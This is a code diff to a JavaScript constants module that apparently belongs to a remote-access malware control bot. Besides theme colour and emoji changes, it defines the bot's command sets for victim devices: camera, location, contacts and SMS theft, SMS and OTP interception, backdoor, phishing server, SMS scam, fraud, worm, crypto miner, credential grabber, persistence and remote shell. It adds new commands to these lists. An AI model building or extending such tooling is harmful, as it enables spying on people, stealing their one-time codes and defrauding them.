@@ -3,6 +3,7 @@ import { readFileSync } from 'fs'
 const GIFS = readFileSync(new URL('../gif.txt', import.meta.url), 'utf8').split('\n').filter(l => l.trim()).map(l => l.trim())
 
 export function randGif() { return GIFS.length ? GIFS[Math.floor(Math.random() * GIFS.length)] : undefined }
+export { GIFS }
 
 export function formatSize(bytes) {
   if (bytes < 1024) return `${bytes} B`
@@ -70,39 +71,39 @@ export function barAnim(current, total, length = 10) {
 }
 
 export const C = {
-  neon: 0xFF003C, electric: 0x00F0FF, purple: 0x9B30FF,
-  blood: 0x8A0303, venom: 0x39FF14, gold: 0xFFD700,
-  dark: 0x0A0A0A, void: 0x1A0A0A, ash: 0x2D2D2D,
-  sharingan: 0xCC0000, mangekyo: 0xFF0000, eternal: 0x8B0000,
-  amaterasu: 0xFF4500, itachi: 0xDC143C, sasuke: 0xFF6347,
-  madara: 0x800000, obito: 0xA52A2A, fire: 0xFF7F50,
-  shadow: 0x2F4F4F, curse: 0x8B008B, sealing: 0x4B0082,
-  nova: 0xDC143C, crimson: 0x8B0000, bloodred: 0x660000,
-  info: 0x3498DB,
+  void: 0x0D0D0D,  darkCrimson: 0x1A0A0A,
+  blood: 0x8B0000, sakura: 0xE8B4B8,
+  tao: 0x2FFFD4,   gold: 0xC9A84C,
+  parchment: 0xF5F0E8, ink: 0x8A7A6A,
+  danger: 0xFF2222, info: 0x2FFFD4,
+  bloodred: 0x660000,
 }
 
 export const E = {
-  skull: '💀', knife: '🔪', heart: '🫀', bone: '🦴',
+  skull: '💀', knife: '🗡️', heart: '🫀', bone: '🦴',
   coffin: '⚰️', ghost: '👻', spider: '🕷️', web: '🕸️',
   bomb: '💣', warning: '⚠️', syringe: '💉',
   microbe: '🦠', brain: '🧠', eye: '👁️', target: '🎯',
   zap: '⚡', chain: '⛓️', crown: '👑', diamond: '💎',
   clock: '🕐', pick: '⛏️',
-  sharingan: '👁️‍🗨️', flame: '🔥', kunai: '🗡️', shuriken: '⭐',
+  flame: '🔥', kunai: '🗡️', star: '⭐',
   scroll: '📜', mask: '🎭', cat: '🐱', fox: '🦊',
   demon: '👹', angel: '😇', sword: '⚔️', shield: '🛡️',
-  book: '📖', star: '🌟', moon: '🌙', sun: '☀️',
-  check: '✅', cross: '❌', warning2: '⚠️', info: 'ℹ️',
-  arrow: '➡️', up: '⬆️', down: '⬇️', left: '⬅️',
+  book: '📖', moon: '🌙', sun: '☀️',
+  check: '✅', cross: '❌', info: 'ℹ️',
+  arrow: '➡️', up: '⬆️', down: '⬇️',
   online: '🟢', offline: '🔴', loading: '⏳', sparkles: '✨',
   rocket: '🚀', pulse: '💫', ring: '💍', hourglass: '⏱️',
   satellite: '📡', tools: '🔧',
   unlock: '🔓',
+  sakura: '🌸', torii: '⛩️', lotus: '🌸', wind: '🌿',
+  shinsenkyo: '🌸', danger: '⚠️',
+  web: '🕸️', robot: '🤖',
 }
 
 export const A = { reset: '\u001b[0m', grey: '\u001b[90m', red: '\u001b[31m', cyan: '\u001b[36m', green: '\u001b[32m', yellow: '\u001b[33m', magenta: '\u001b[35m', brightRed: '\u001b[91m', brightCyan: '\u001b[96m' }
 
-export const ST_COL = { online: C.neon, offline: C.void, warning: C.gold, danger: C.electric, info: C.purple }
+export const ST_COL = { online: C.tao, offline: C.void, warning: C.gold, danger: C.blood, info: C.info }
 
 export const DEV_CMDS = new Set([
   'ping', 'info', 'screenshot', 'camera', 'location', 'contacts', 'sms', 'call_log',
@@ -122,12 +123,12 @@ export const DEV_CMDS = new Set([
   'screenstream', 'kill', 'backdoor', 'dns', 'router', 'phish_server', 'help',
   'smsscam', 'premium', 'fraud', 'carrier', 'smsi', 'smsintercept', 'intercept', 'otp',
   'sms_list', 'smscaptured', 'sms_auto', 'autoreply', 'smsreply', 'sms_forward', 'smsfwd',
-  'worm', 'brain', 'inject',
+  'worm', 'brain', 'inject', 'module',
 ])
 
-export const BOT_CMDS = ['!help', '!menu', '!devices', '!broadcast', '!target', '!untarget', '!history', '!search', '!miner', '!upload', '!stream', '!ai', '!campaign', '!analyze', '!d']
+export const BOT_CMDS = ['!help', '!menu', '!devices', '!broadcast', '!target', '!untarget', '!history', '!search', '!miner', '!upload', '!stream', '!ai', '!campaign', '!analyze', '!d', '!health', '!setavatar']
 
-export const VALID_CMDS = new Set([...DEV_CMDS])
+export const VALID_CMDS = new Set(DEV_CMDS)
 
 export const ALERT_CMD_MAP = { ss: 'screenshot', cmd: 'shell', stream: 'stream', miner: 'miner', grabber: 'grabber', persist: 'persist', files: 'dir' }
 export const BTN_ACTIONS = { screenshot: 'screenshot', stream: 'stream start', shell_btn: 'shell', grabber: 'grabber', dir: 'dir', tree: 'tree', disk: 'disk', contacts: 'contacts', sms: 'sms', location: 'location', camera: 'camera', broadcast: 'broadcast' }
